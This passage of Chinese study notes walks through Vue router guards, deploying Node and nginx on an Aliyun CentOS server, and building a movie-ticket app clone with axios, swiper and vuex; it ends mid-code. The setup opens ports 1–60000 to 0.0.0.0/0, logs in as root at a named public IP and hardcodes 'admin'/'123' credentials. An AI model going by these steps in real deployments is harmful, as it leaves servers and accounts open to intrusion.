#### 路由组件钩子：

```
  beforeRouteEnter (to, from, next) {
    // 在渲染该组件的对应路由被 confirm 前调用
    // 不！能！获取组件实例 `this`
    // 因为当守卫执行前，组件实例还没被创建
  },
  beforeRouteUpdate (to, from, next) {
    // 在当前路由改变，但是该组件被复用时调用    
    // 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，
    // 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。
    // 可以访问组件实例 `this`
  },
  beforeRouteLeave (to, from, next) {
    // 导航离开该组件的对应路由时调用
    // 可以访问组件实例 `this`
  }

```









## 十六. [阿里云服务器](https://www.aliyun.com/?spm=5176.12825654.amxosvpfn.2.7b652c4aWmyg7T&accounttraceid=ab7abeb77eda4ac1a51b43ba1e1c77a6bvsl)

Centos 64位  7.6  用户名都叫做root!

1.改密码  重启实例 （改密码后需要重启实例才会有效！！）
2.配置安全组   1/60000   0.0.0.0/0 

3.(ls  cd / )远程控制  记录一个密码！  （ git黑窗口   ssh root@公网IP 47.96.0.211）

4.安装node.js
现在可以使用yum命令安装Node.js了。
sudo yum install nodejs   (node -v  看版本)

sudo npm install -g n

n 12.22.0   （node-v）

关闭窗口，再重新连接





5.安装nginx服务器（静态服务器）
https://www.linuxidc.com/Linux/2016-09/134907.htm

/software/niginx-1.10.3.tar.gz



cd software
tar -zxvf nginx-1.10.3.tar.gz



cd nginx-1.10.3

./configure   

make  

 make install



可能会报错！缺少一个文件

https://blog.csdn.net/u012373281/article/details/94737795







6.装好了之后直接访问公网  47.96.0.211

/usr/local/nginx/html/ ===> 文件存放位置





![](https://s3.ax1x.com/2021/01/20/sRg2lD.png)





[远程mongodb的安装教程](http://www.cnblogs.com/web424/p/6928992.html)



npm install pm2 -g  （全局安装pm2）

> 可能会报错：(后续升级node版本就好了)
>
> spawning pm2 daemon with pm2_home=/root/.pm2



pm2 list 

pm2 start  ./bin/www  --name  "名称"
pm2 delete id   删除
pm2 stop id     停掉
pm2 restart id  重启





[域名与备案](https://www.cnblogs.com/lwla/p/9828449.html)







**部署线上接口**

   1)本地运行express-pro项目，开启本地数据库，配合postman接口进行调试，测验OK了。

   2)远程创建 node-pro

1. ​	不要忘记执行 
2. ​	npm install nodemon -g
3. ​	npm i



   3)想要长期挂起服务，需要安装pm2

​    	npm instal pm2 -g

​		pm2  start  ./bin/www  --name  "express接口"

​    	后续 pm2的命令：

​		pm2 start 启动服务id

​		pm2 delete 删除服务id

​        pm2 restart 重启服务id



   4)直接用postman进行接口测试

​	http://公网IP:3000/api/user/loginin  (post请求  username/password)





# 卖座项目

## 一 . 轮播图实现

npm view swiper versions

 yarn add swiper@5.2.0

main.js

```
// 引入swiper的css样式文件
import 'swiper/css/swiper.min.css'
```



Films.vue

```
<script>
import axios from 'axios'
export default {
  data () {
    return {
      banners: []
    }
  },
  async created () {
    const res = await axios.get('https://m.maizuo.com/gateway?type=2&cityId=310100&k=6535724', {
      headers: {
        'X-Client-Info': '{"a":"3000","ch":"1002","v":"5.0.4","e":"1629341711132456791408641","bc":"310100"}',
        'X-Host': 'mall.cfg.common-banner'
      }
    })
    console.log(res.data.data)
    this.banners = res.data.data
  }
}
</script>
```



考虑到轮播图的复用性，如果很多地方都需要用到轮播图的话，需要进行封装。

components/swiper/index.vue

```
<template>
    <div class='swiper-container'>
      <div class="swiper-wrapper">
          <slot></slot>
      </div>
    </div>
</template>

<script>
export default {

}
</script>

<style>

</style>

```



```
<SwiperCom>
      <div
        class="swiper-slide"
        v-for='banner in banners'
        :key='banner.bannerId'
      >
        <img :src="banner.imgUrl" width='100%' alt="">
      </div>
    </SwiperCom>
```

```
async created () {
    const res = await axios.get('https://m.maizuo.com/gateway?type=2&cityId=310100&k=6535724', {
      headers: {
        'X-Client-Info': '{"a":"3000","ch":"1002","v":"5.0.4","e":"1629341711132456791408641","bc":"310100"}',
        'X-Host': 'mall.cfg.common-banner'
      }
    })
    console.log(res.data.data)
    this.banners = res.data.data
    /*
      实例化完毕后，发现轮播图划不过去？
      数据改变了，引发虚拟dom对比，内部通过diff算法算出patch差异部分，再去更新真实dom
      必须要保证数据改变了时候，页面中4个swiper-slide真实dom结构出现了以后，再去实例化操作。
    */
    this.$nextTick(() => { // 更新完毕后的延迟回调
      // eslint-disable-next-line no-new
      new Swiper('.swiper-container', {
        loop: true
      })
    })
  }
```



后续通过scoped样式穿透，修改了第三方插件swiper里面的样式代码。

因为style上面的scoped属性，只能限制样式影响自身组件，不能影响其它的组件。

```
<style scoped lang='scss'>
  /*scoped之后，只能影响自身组件*/
  /deep/ .swiper-pagination{
    left:136px!important;
  }
</style>

```



发现每次请求数据的时候，都需要写很长的url与headers字段，可以借助create方法，创建一个axios实例。

utils/http.js

```
import axios from 'axios'
const instance = axios.create({
  baseURL: 'https://m.maizuo.com',
  timeout: 5000,
  headers: {
    'X-Client-Info': '{"a":"3000","ch":"1002","v":"5.0.4","e":"1629341711132456791408641","bc":"310100"}'
  }
})
export default instance

```



```
import instance from '@/utils/http'

 const res = await instance.get('/gateway?type=2&cityId=310100&k=6535724', {
      headers: {
        'X-Host': 'mall.cfg.common-banner'
      }
    })
```





## 二. 通用样式与rem的布局

stylesheets/main.scss

```
@import '_reset.scss';
```

main.js

```
import './stylesheets/main.scss'
// 引入rem.js
import './utils/rem'
```



utils/rem.js

```

document.documentElement.style.fontSize =
    document.documentElement.clientWidth / 3.75 + 'px'

```



iconfont图标的实现：

public/index.html

```
 <!--引入线上的链接-->
    <link rel="stylesheet" href="http://at.alicdn.com/t/font_2339840_ugs20m0pwas.css">
```

```
navs: [
        { id: 1, title: '电影', path: '/films', icon: 'icon-dianying' },
        { id: 2, title: '影院', path: '/cinema', icon: 'icon-yingyuan' },
        { id: 3, title: '我的', path: '/center', icon: 'icon-My' }
      ]
```

```
<div class="tabbar">
    <ul>
        <li v-for='nav in navs' :key='nav.id'>
            <router-link
                :to='{path:nav.path}'
                active-class="active"
            >
            <i class='iconfont' :class='nav.icon'></i>
            {{nav.title}}
            </router-link>
        </li>
    </ul>
  </div>
```



1px边框解决：

https://www.cnblogs.com/WX1211/articles/11598415.html

```
@import '_reset.scss';
@import '_border.scss';
```

```
<ul class='border-top'>
```





## 三. 登录实现

### 3-1 login界面

```
login () {
      axios.post('http://47.96.0.211:3000/api/user/signin', {
        username: 'admin',
        password: '123'
      }).then(res => {
        console.log(res)
      })

      // setTimeout(() => {
      //   const token = 'adasdassad'
      //   localStorage.setItem('token', token)
      //   this.$router.push(this.$route.query.redirect)
      // }, 1000)
    }
```

受到同源策略问题，跨域！

可以通过前端代理方式解决！

```
proxy: {
      '/info': {
        target: 'http://47.96.0.211:3000',
        pathRewrite: {
          '^/info': ''
        }
      }
    }
```



### 3-2 axios的封装

login.vue

```

<script>
import { instance2 } from '@/utils/http'
export default {
  methods: {
    login () {
      instance2.post('/api/user/signin', {
        username: 'admin',
        password: '123'
      }).then(res => {
        console.log(res)
        // 需要将后端返回的token存入到本地存储中
        localStorage.setItem('token', res.token)
        this.$router.push(this.$route.query.redirect)
      }).catch(err => {
        console.log(err)
      })

      // setTimeout(() => {
      //   const token = 'adasdassad'
      //   localStorage.setItem('token', token)
      //   this.$router.push(this.$route.query.redirect)
      // }, 1000)
    }
  }
}
</script>
```



```
import axios from 'axios'
const instance = axios.create({
  baseURL: 'https://m.maizuo.com',
  timeout: 5000,
  headers: {
    'X-Client-Info': '{"a":"3000","ch":"1002","v":"5.0.4","e":"1629341711132456791408641","bc":"310100"}'
  }
})

// http://47.96.0.211的接口发出的请求都会被拦截
const instance2 = axios.create({
  baseURL: '/info',
  timeout: 5000
})

// 请求之前的拦截器
instance2.interceptors.request.use(config => {
  console.log('config===>', config)
  return config
})

// 响应之后的拦截器
instance2.interceptors.response.use(res => {
  if (res.data.flag) {
    return res.data.data
  } else {
    // eslint-disable-next-line prefer-promise-reject-errors
    return Promise.reject('失败了 ....')
  }
})

export {
  instance,
  instance2
}

```



因为token会失效的，一旦token失效了，需要让用户重新登录。

```

// 全局的前置路由守卫
router.beforeEach((to, from, next) => {
  if (to.matched.some(record => record.meta.requiresAuth)) { // 路径的配置项meta中写requiresAuth,就需要验证
    if (localStorage.getItem('token')) { // 如果本地存储中存在token，就next
      // 需要判断token是否失效，如果没有失效，next,否则跳入登录界面。
      instance2.post('/api/user/issignin').then(res => { // token没有失效，直接放行
        next()
      }).catch(() => { // token已经失效了，直接跳转到登录界面
        next({
          path: '/login',
          query: { redirect: to.fullPath }
        })
      })
    } else {
      next({
        path: '/login',
        query: { redirect: to.fullPath }
      })
    }
  } else {
    next()
  }
})

export default router

```

```
import axios from 'axios'
const instance = axios.create({
  baseURL: 'https://m.maizuo.com',
  timeout: 5000,
  headers: {
    'X-Client-Info': '{"a":"3000","ch":"1002","v":"5.0.4","e":"1629341711132456791408641","bc":"310100"}'
  }
})

// http://47.96.0.211的接口发出的请求都会被拦截
const instance2 = axios.create({
  baseURL: '/info',
  timeout: 5000
})

// 请求之前的拦截器
// 可以在请求头上面统一携带公共的一些字段，例如token字段。
// 凡是这个instance2发起的请求，请求头上面都会自动的带token这个字段了，就不需要每个接口单独再去写token字段了。
instance2.interceptors.request.use(config => {
  config.headers = { ...config.headers, token: localStorage.getItem('token') }
  return config
})

// 响应之后的拦截器
// 可以根据后端返回的不同的状态码进行判断，返回不同的业务数据或者错误的处理。
instance2.interceptors.response.use(res => {
  if (res.data.flag) {
    return res.data.data
  } else {
    // eslint-disable-next-line prefer-promise-reject-errors
    return Promise.reject('失败了 ....')
  }
})

export {
  instance,
  instance2
}

```



## 四. nowplaying正在热映实现

### 4-1 布局正在热映界面

```
<template>
  <div class='nowplaying'>
    <div
      class="film-item"
      v-for='data in dataList'
      :key='data.filmId'
    >
      <img :src="data.poster" alt="">
      <div class="content">
        <h4>{{data.name}}</h4>
        <p>观众评分:{{data.grade}}</p>
        <p>主演：</p>
      </div>
    </div>
  </div>
</template>

<script>
import { instance } from '@/utils/http'
export default {
  data () {
    return {
      dataList: []
    }
  },
  async created () {
    const res = await instance.get('https://m.maizuo.com/gateway?cityId=310100&pageNum=1&pageSize=10&type=1&k=4475560', {
      headers: {
        'X-Host': 'mall.film-ticket.film.list'
      }
    })
    console.log(res.data.data.films)
    this.dataList = res.data.data.films
  }
}
</script>

<style scoped lang='scss'>
  .nowplaying{
    padding:.15rem;
    .film-item{
      display: flex;
      padding: .15rem .15rem .15rem 0;
      img{
        width:.66rem;
        height:.97rem;
      }
      .content{
        padding-left:.2rem;
      }
    }
  }
</style>

```



### 4-2 演员过滤的实现

utils/filters.js

```
import Vue from 'vue'

// 定义演员的过滤器
Vue.filter('filterActors', (actors, options = ' ') => {
  return actors.map(item => {
    return item.name
  }).join(options)
})

```

main.js

```
// 引入filters.js
import './utils/filters'
```

Nowplaying.vue

```
<p>主演：{{data.actors | filterActors}}</p>
```





### 4-3 封装通用组件file-item

因为正在热映页面与即将上映页面结构几乎是一样的，所以可以通过封装组件实现复用。

components/film-item/index.vue

```
<template>
  <div class="film-item">
      <img :src="data.poster" alt="">
      <div class="content">
        <h4>{{data.name}}</h4>
        <p>观众评分:{{data.grade}}</p>
        <p>主演：{{data.actors | filterActors}}</p>
      </div>
  </div>
</template>

<script>
export default {
  props: {
    data: { // 接受Nowplaying传递过来的data属性，获取到对象了
      type: Object
    }
  }
}
</script>

<style scoped lang='scss'>
    .film-item{
      display: flex;
      padding: .15rem .15rem .15rem 0;
      img{
        width:.66rem;
        height:.97rem;
      }
      .content{
        padding-left:.2rem;
      }
    }
</style>

```



Nowplaying.vue

```
import FilmItem from '@/components/film-item'
export default {
  components: {
    FilmItem
  },
```

```
<template>
  <div class='nowplaying'>
    <FilmItem
       v-for='data in dataList'
      :key='data.filmId'
      :data='data'  //给FilmItem这个子组件传递data属性，代表遍历的每一个电影对象
    ></FilmItem>
  </div>
</template>
```





ComingSoon:

```
<template>
  <div class='nowplaying'>
    <FilmItem
       v-for='data in dataList'
      :key='data.filmId'
      :data='data'
    ></FilmItem>
  </div>
</template>

<script>
import { instance } from '@/utils/http'
import FilmItem from '@/components/film-item'
export default {
  components: {
    FilmItem
  },
  data () {
    return {
      dataList: []
    }
  },
  async created () {
    const res = await instance.get('https://m.maizuo.com/gateway?cityId=310100&pageNum=1&pageSize=10&type=2&k=9581679', {
      headers: {
        'X-Host': 'mall.film-ticket.film.list'
      }
    })
    this.dataList = res.data.data.films
  }
}
</script>

<style scoped lang='scss'>
  .nowplaying{
    padding:.15rem;
  }
</style>

```



对于film-item进行细节调整：

```
<template>
  <div class="film-item">
      <img :src="data.poster" alt="">
      <div class="content">
        <h4>{{data.name}}</h4>
        <p v-if='data.grade'>观众评分:{{data.grade}}</p>
        <p>主演：{{data.actors | filterActors}}</p>
        <!--如果传递的filmtype是comingsoon的话，我就会在即将上映的模板中出现-->
        <p v-if='filmtype === "comingsoon"'>上映日期：{{data.premiereAt}}</p>
      </div>
  </div>
</template>

<script>
export default {
  props: {
    data: { // 传递的数据，为了显示使用的
      type: Object
    },
    filmtype: { // 电影的类型
      type: String
    }
  }
}
</script>
```



ComingSoon.vue

```
<template>
  <div class='comingsoon'>
    <FilmItem
       v-for='data in dataList'
      :key='data.filmId'
      :data='data'
      filmtype='comingsoon'
    ></FilmItem>
  </div>
</template>
```



对于时间格式化，采用[moment](https://momentjs.com/docs/)插件实现

yarn add moment

fillters.js

```
import moment from 'moment'

// 指明显示时间是中文的，默认是英文的
moment.locale('zh-cn', {
  weekdaysShort: '星期日_星期一_星期二_星期三_星期四_星期五_星期六'.split('_')
})
// 全局的对于上映日期的过滤器
Vue.filter('filterDate', time => {
  return moment(time * 1000).format('ddd  MM月D日')
})

```

```
<p v-if='filmtype === "comingsoon"'>上映日期：{{data.premiereAt | filterDate}}</p>
```



设置演员单行显示省略号：

```
.content{
        padding-left:.2rem;
        .actors{
            width:1.9rem;
            overflow: hidden;  //溢出隐藏
            text-overflow: ellipsis; //省略号实现
            white-space: nowrap;  //强制不换行
        }
      }
    }
```



扩充：如果显示多行省略好的话：

```
<style>
            div {
                width: 400px;
                color: red;
                display: -webkit-box;
                -webkit-box-orient: vertical;
                -webkit-line-clamp: 4;
                overflow: hidden;
                border:1px solid #ccc;
            }
        </style>
```



点击film-item的时候，跳转到详情页面，可以采用声明式导航路由跳转：

```
<template>
  <router-link class="film-item" :to='"/detail/"+data.filmId'>
    <img :src="data.poster" alt="">
    <div class="content">
      <h4>{{data.name}}</h4>
      <p v-if='data.grade'>观众评分:{{data.grade}}</p>
      <p class='actors'>主演：{{data.actors | filterActors}}</p>
      <p v-if='filmtype === "comingsoon"'>上映日期：{{data.premiereAt | filterDate}}</p>
    </div>
  </router-link>
</template>
```





## 五. 详情页面的 实现

### 5-1 详情页面的布局

```
<template>
  <div v-if="filmInfo">
    <div class="detail-img">
      <img :src="filmInfo.poster" alt="">
    </div>
    <div class="detail-content">
      <h4>{{filmInfo.name}}</h4>
      <p>{{filmInfo.category}}</p>
      <p>{{filmInfo.premiereAt | filterDateYear}}上映</p>
      <p>{{filmInfo.nation}} | {{filmInfo.runtime}}分钟</p>
      <p>{{filmInfo.synopsis}}</p>
    </div>
  </div>
</template>

<script>
import { instance } from '@/utils/http'
export default {
  data () {
    return {
      filmInfo: null
    }
  },
  async created () {
    const res = await instance.get(`https://m.maizuo.com/gateway?filmId=${this.$route.params.id}&k=3197631`, {
      headers: {
        'X-Host': 'mall.film-ticket.film.info'
      }
    })
    console.log(res)
    this.filmInfo = res.data.data.film
  }
}
</script>

<style lang='scss' scoped>
  .detail-img{
    width:100%;
    height:2.32rem;
    position: relative;
    overflow: hidden;
    img{
      position: absolute;
      width:100%;
      top: 50%;
      transform: translateY(-52%);
    }
  }
  .detail-content{
    padding:.15rem;
  }
</style>

```



### 5-2 折叠动画效果

```
<p class='icon'><i class='iconfont icon-xiangxia'></i></p>
```

```
.icon{
    position: relative;
    i{
      position: absolute;
      left:50%;
      transform: translateX(-50%);
    }
  }
```



```
data () {
    return {
      filmInfo: null,
      flag: true
    }
  },
```

```
<p class='icon' @click='flag=!flag'><i class='iconfont' :class='flag?"icon-xiangxia":"icon-xiangshang"'></i></p>
```





定义active的样式，根据flag进行切换：

```
data () {
    return {
      filmInfo: null,
      flag: true,
      height: ''
    }
  },
```

```
 <div :class='{active:flag}' :style='{height:height,overflow:"hidden",transition:"all 1s"}'>
        <p class='synopsis'>{{filmInfo.synopsis}}</p>
      </div>
      <p class='icon' @click='flag=!flag'><i class='iconfont' :class='flag?"icon-xiangxia":"icon-xiangshang"'></i></p>
```

```
.active{
    height:38px!important;
  }
```

```
 async created () {
    const res = await instance.get(`https://m.maizuo.com/gateway?filmId=${this.$route.params.id}&k=3197631`, {
      headers: {
        'X-Host': 'mall.film-ticket.film.info'
      }
    })
    console.log(res)
    this.filmInfo = res.data.data.film
    // this.height = (this.filmInfo.synopsis.length / 26) * 20 + 'px'

	// 当数据异步获取之后，立马访问真实dom是不存在的，需要将其放在nextTick的回调中才可以访问到真实dom结构
    this.$nextTick(() => {
      this.height = document.querySelector('.synopsis').offsetHeight + 'px'
      // this.height = this.$refs.pdom.offsetHeight + 'px'   // 采用了ref标记，获取dom元素
    })
  }
```



### 5-3  演职人员

```
<div class="actor-swiper">
      <h4>演职人员：</h4>
      <SwiperCom cName='actors'>
        <div
          class="swiper-slide"
          v-for='actor in filmInfo.actors'
          :key='actor.name'
        >
          <div class="actor-img">
            <img :src="actor.avatarAddress" alt="">
            <p class='actor-name'>{{actor.name}}</p>
          </div>
        </div>
      </SwiperCom>
    </div>

    <div class="photo-swiper">
      <h4>剧照：</h4>
      <SwiperCom cName='photos'>
        <div
          class="swiper-slide"
          v-for='photo in filmInfo.photos'
          :key='photo'
        >
          <img :src="photo" alt="">
        </div>
      </SwiperCom>
    </div>
```

```
this.$nextTick(() => {
      // this.height = document.querySelector('.synopsis').offsetHeight + 'px'
      this.height = this.$refs.pdom.offsetHeight + 'px'

      // 进行轮播图的实例化
      // eslint-disable-next-line no-new
      new Swiper('.actors', {
        slidesPerView: 4.2,
        spaceBetween: 10
      })

      // eslint-disable-next-line no-new
      new Swiper('.photos', {
        slidesPerView: 2.5,
        spaceBetween: 20
      })
    })
```

```
<template>
    <div class='swiper-container' :class='cName'>
        <div class="swiper-wrapper">
            <slot></slot>
        </div>
        <div class="swiper-pagination"></div>
    </div>
</template>

<script>
export default {
  props: ['cName']
}
</script>

<style>

</style>

```



### 5-4 详情页面头部实现

```
<!--头部-->
    <div class="detailtitle">
      <i class='iconfont icon-xiangzuo'></i>
      <span>{{filmInfo.name}}</span>
    </div>
```

```
.detailtitle{
    position: fixed;
    top: 0;
    width: 100%;
    height: .44rem;
    background: #fff;
    z-index: 10;
    line-height: .44rem;
    text-align: center;
    i{
      position: absolute;
      left:10px;
    }
  }
```

```
mounted () {
    window.onscroll = function () {
      console.log(111111111)
    }
  },
  beforeDestroy () {
    window.onscroll = null
  },
```



对于滚动来说，默认需要写两个钩子函数，我们可以借助自定义指令来去实现这个功能。

utils/directives.js

```
import Vue from 'vue'

// 创建自定义指令v-title
// 自定义指令钩子函数？ bind inserted update componentUpdated unbind
// transition在display:none|block之间切换是没有任何过渡效果。
Vue.directive('title', {
  inserted (el, binding) {
    el.style.opacity = 0
    window.onscroll = function () {
      // 获取滚动高度
      const stop = document.body.scrollTop || document.documentElement.scrollTop
      if (stop > (binding.value || 30)) {
        el.style.opacity = 1
      } else {
        el.style.opacity = 0
      }
    }
  },
  unbind () {
    window.onscroll = null
  }
})

```

main.js

```

// 引入directives.js
import './utils/directives'
```

```
 <!--头部-->
    <div class="detailtitle" v-title='10'>
      <i class='iconfont icon-xiangzuo'></i>
      <span>{{filmInfo.name}}</span>
    </div>
```





### 5-5 剧照实现

detail/photos.vue

```
<template>
  <div class='photos'>
      剧照页面...
  </div>
</template>

<script>
export default {

}
</script>

<style lang='scss' scoped>
    .photos{
        position: fixed;
        width:100%;
        height:100%;
        top:0;
        left:0;
        background: #fff;
        z-index: 11;
    }
</style>

```

detail.vue

```
import Photos from './detail/photos.vue'
components: {
    SwiperCom,
    Photos
  },
```

```
 data () {
    return {
      filmInfo: null,
      flag: true,
      height: '',
      isShow: false // 控制剧照是否显示
    }
  },
```

```
<!--显示剧照-->
<Photos v-show='isShow'></Photos>
```

```
<h4 @click='isShow=true'>剧照：</h4>
```



后续发现剧照上面的头部样式结构与详情页面的样式结构基本是一致的，所以我们可以单独抽离出来封装成全局组件。

components/mz-title/index.vue

```
<template>
    <div class="detailtitle">
        <i class='iconfont icon-xiangzuo'></i>
        <span>{{name}}</span>
    </div>
</template>

<script>
export default {
  props: ['name']
}
</script>

<style lang='scss' scoped>
.detailtitle{
    position: fixed;
    top: 0;
    width: 100%;
    height: .44rem;
    background: #fff;
    z-index: 10;
    line-height: .44rem;
    text-align: center;
    transition: all .5s linear;
    i{
      position: absolute;
      left:10px;
    }
  }
</style>

```



utils/globalComp.js

```
import Vue from 'vue'
import MzTitle from '@/components/mz-title'
Vue.component('mz-title', MzTitle)
```

main.js

```
import '@/utils/globalComp.js'
```

detail.vue

```
<mz-title :name='filmInfo.name' v-title='10'></mz-title>
```

photos.vue

```
<div class='photos'>
    <mz-title name='剧照(5)'></mz-title>
 </div>
```



后续给组件mz-title的返回箭头，绑定点击事件：

```
<template>
    <div class="detailtitle">
        <i class='iconfont icon-xiangzuo' @click='back'></i>
        <span>{{name}}</span>
    </div>
</template>

<script>
export default {
  props: ['name'],
  methods: {
    back () {
      // this.$router.back()
    }
  }
}
</script>

```

会发现后续进入剧照页面，点击返回的时候，直接返回到了正在热映页面！

```
<script>
export default {
  props: ['name'],
  methods: {
    back () {
      // this.$router.back()
      // 由父组件决定到底执行什么业务
      this.$emit('change')
    }
  }
}
</script>
```



detail.vue

```
<mz-title @change='back' :name='filmInfo.name' v-title='10'></mz-title>

methods: {
    back () {
      this.$router.back()
    }
  },
```



photos.vue

```
<div class='photos'>
    <mz-title @change='back' name='剧照(5)'></mz-title>
  </div>
  
  methods: {
    back () {
      this.$parent.isShow = false
    }
  }
```



另外还可以这样实现：

detail.vue

```
 <!--显示剧照-->
 <Photos v-show='isShow'>
	 <mz-title @change='back2' :name='"剧照("+filmInfo.photos.length+")"'></mz-title>
 </Photos>
```

```
methods: {
    back () {
      this.$router.back()
    },
    back2 () {
      this.isShow = false
    }
  },
```

photos.vue

```
<template>
  <div class='photos'>
    <slot></slot>
    <ul>
        <li v-for='photo in photos' :key='photo'>
            <img :src="photo" alt="">
        </li>
    </ul>
  </div>
</template>

<script>
export default {
  props: ['photos']
}
</script>

<style lang='scss' scoped>
    .photos{
        position: fixed;
        width:100%;
        height:100%;
        top:0;
        left:0;
        background: #fff;
        z-index: 11;
    }
    ul{
        position: relative;
        top:50px;
        display: flex;
        flex-wrap: wrap; /*flex的换行、主轴*/
        li{
            width:33.33333333%;
            height:1.37rem;
            padding: 1px;
            img{
                width:100%;
                height:100%;
            }
        }
    }
</style>

```



detail.vue

```
<!--显示剧照-->
<Photos v-if='filmInfo.photos' v-show='isShow' :photos='filmInfo.photos'>
	<mz-title @change='back2' name='剧照(5)'></mz-title>
</Photos>
<div v-else>暂无剧照</div>
```





## 六 影院布局与渲染

### 6-1 获取数据

```
<script>
import { instance } from '@/utils/http'
export default {
  data () {
    return {
      cinemaList: []
    }
  },
  async created () {
    const res = await instance.get('https://m.maizuo.com/gateway?cityId=310100&ticketFlag=1&k=99575', {
      headers: {
        'X-Host': 'mall.film-ticket.cinema.list'
      }
    })
    console.log(res.data.data.cinemas)
    this.cinemaList = res.data.data.cinemas
  }
}
</script>
```



```
<template>
  <div>
    <div class="title">
      <div class="left">上海</div>
      <div class="center">影院</div>
      <div class="right"><i class='iconfont icon-sousuo'></i></div>
    </div>
    <div class="select">
      <div>全城</div>
      <div>app订票</div>
      <div>最近去过</div>
    </div>
    <!--渲染影院数据-->
    <div class="cinemalist">
      <ul>
        <li v-for='data in cinemaList' :key='data.cinemaId'>
          <h4>{{data.name}}</h4>
          <p>{{data.address}}</p>
        </li>
      </ul>
    </div>
  </div>
</template>
```

```
.cinemalist{
    position: relative;
    top:.88rem;
    background: #fff;
    li{
      padding:.15rem;
      p{
        width:90%;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
      }
    }
  }
  .title{
    position: fixed;
    height: .44rem;
    top: 0;
    left: 0;
    width: 100%;
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 .2rem;
    z-index: 10;
  }
  .select{
    position: fixed;
    height: .44rem;
    top: .44rem;
    left: 0;
    width: 100%;
    background: #fff;
    display: flex;
    align-items: center;
    justify-content: space-around;
    z-index: 10;
  }
```



### 6-2  选择区域的实现

```
 computed: {
    cinemaArea () {
      // 遍历影院数组，将所有对象的影院的区域放在distructArr数组中，肯定有300多项重复区域数据
      const distructArr = this.cinemaList.map(item => {
        return item.districtName
      })
      // 需要进行数组去重，获取唯一的影院的区域  ---> 3种去重方案 （set、indexof、reduce）
      // https://segmentfault.com/a/1190000016418021
      // return Array.from(new Set(distructArr))
      return ['全城', ...new Set(distructArr)]
    }
  },
```

```
<!--选择区域的实现-->
    <div class="area">
      <ul>
        <li v-for='data in cinemaArea' :key='data'>{{data}}</li>
      </ul>
    </div>

```

```
.area{
    position: fixed;
    top:.88rem;
    z-index: 10;
    background: #fff;
    ul{
      width:100%;
      display: flex;
      flex-wrap: wrap;
      padding-left: 0.1rem;
      li{
        width:20%;
        height:30px;
        line-height: 30px;
        border:1px solid rgba(210,214,220,.5);
        margin:.07rem;
        text-align: center;
      }
    }
  }
```





### 6-3 实现区域的选择切换

```
data () {
    return {
      cinemaList: [],
      currentArea: '全城' // 当前用户选择的电影区域
    }
  },
```



```
<!--选择区域的实现-->
    <div class="area">
      <ul>
        <li
          v-for='data in cinemaArea'
          :key='data'
          @click='currentArea = data'
        >{{data}}</li>
      </ul>
    </div>
```



```
getCinemaList () {
      // 当用户点击了区域，currentArea就会更改，计算属性重新计算
      if (this.currentArea === '全城') return this.cinemaList
      return this.cinemaList.filter(item => { // 从数组里面筛选出符合当前点击的currentArea的数组列表数据
        if (item.districtName === this.currentArea) { // [{distriName:'金山区',name,},{distriname:'金山区'}]
          return true
        } else {
          return false
        }
      })
    }
```

```
<!--渲染影院数据-->
    <div class="cinemalist">
      <ul>
        <li v-for='data in getCinemaList' :key='data.cinemaId'>
          <h4>{{data.name}}</h4>
          <p>{{data.address}}</p>
        </li>
      </ul>
    </div>
```



细节完善：

```
 .active{
    color:#ff5f16;
  }
  .active-area{
    border-color: #ff5f16!important;
  }
```

```
  <!--选择区域的实现-->
    <div class="area" v-show='isShow'>
      <ul>
        <li
          v-for='data in cinemaArea'
          :key='data'
          @click='currentArea = data;isShow=false'
          :class='{"active-area":data === currentArea}'  //看一下那个区域与currentArea一致，一致的就会添加class
        >{{data}}</li>
      </ul>
    </div>
```

```
<div class="select">
      <div @click='isShow=!isShow' :class='{active:isShow}'>{{currentArea}}</div>
      <div>app订票</div>
      <div>最近去过</div>
    </div>
```



遮罩层实现：

```
 .overlay{
    position: fixed;
    top:0;
    left:0;
    width:100%;
    height:100%;
    opacity: .5;
    z-index: 11;
    background: rgba(0,0,0,0.6);
  }
```

```
 <!--遮罩层-->
 <div class="overlay" v-show="isShow" @click="isShow=false"></div>
```





### 6-4 底部tabbar的隐藏

```
{
    path: '/cinema/search',
    component: () => import('../views/cinema/search'),
    meta: {
      notShowTabbar: true // 只要为true的就会隐藏tabbar底部栏
    }
  },
```

```
<Tabbar  v-if="!this.$route.meta.notShowTabbar"></Tabbar>
```



## 七. vuex使用

### 7-1 vuex安装引入

```bash
yarn add vuex
```

store/index.js

```
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)
const store = new Vuex.Store({

})
export default store
```

main.js

```
import store from './store'

new Vue({
  render: h => h(App),
  store, // 组件实例的this上面就会有store相关的api了（$store）
  router // 组件实例的this上面就会有路由相关的api了（$route/$router）  router-link实现声明式导航  router-view
}).$mount('#app')
```



### 7-2 vuex解决search的tabbar

```
import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)
const store = new Vuex.Store({
  state: { // 用来存储多组件之间的共享状态的
    isTabbarShow: true
  },
  mutations: { // 用来更改状态的地方
    show (state) {
      state.isTabbarShow = true
    },
    hide (state) {
      state.isTabbarShow = false
    }
  }
})
export default store
```

App.vue

```
<Tabbar v-if='$store.state.isTabbarShow'></
```

Search.vue

```
export default {
  created () {
    // 需要调用更改vuex的state的hide方法
    this.$store.commit('hide')
  },
  beforeDestroy () {
    this.$store.commit('show')
  }
}
```





### 7-3 vuex管理影院数据

在影院中进行异步请求获取数据后存入vuex的state中，后续进入到搜索页面的时候，就不需要再次发起请求影院数据了，直接从vuex共享状态中获取使用即可。

```
state: { // 用来存储多组件之间的共享状态的
    isTabbarShow: true,
    cinemaList: [] // 存储异步的影院数据
  },
  actions: { // 专门用来在vuex中进行异步操作的地方，获取到数据后调用mutations方法，从而更改vuex的内部状态
    async getCinemaListAsync (context) {
      const res = await instance.get('https://m.maizuo.com/gateway?cityId=310100&ticketFlag=1&k=99575', {
        headers: {
          'X-Host': 'mall.film-ticket.cinema.list'
        }
      })
      console.log('res====================>', res)
      // 需要调用具体的setCinemaList这个mutations方法，来去更改vuex的cinemaList这个状态
      context.commit('setCinemaList', res.data.data.cinemas)
    }
  },
  mutations: { // 用来更改状态的地方
    show (state) {
      state.isTabbarShow = true
    },
    hide (state) {
      state.isTabbarShow = false
    },
    setCinemaList (state, cinema) {
      state.cinemaList = cinema
    }
  }
```

```
async created () {
    // 需要触发actions的getCinemaListAsync方法
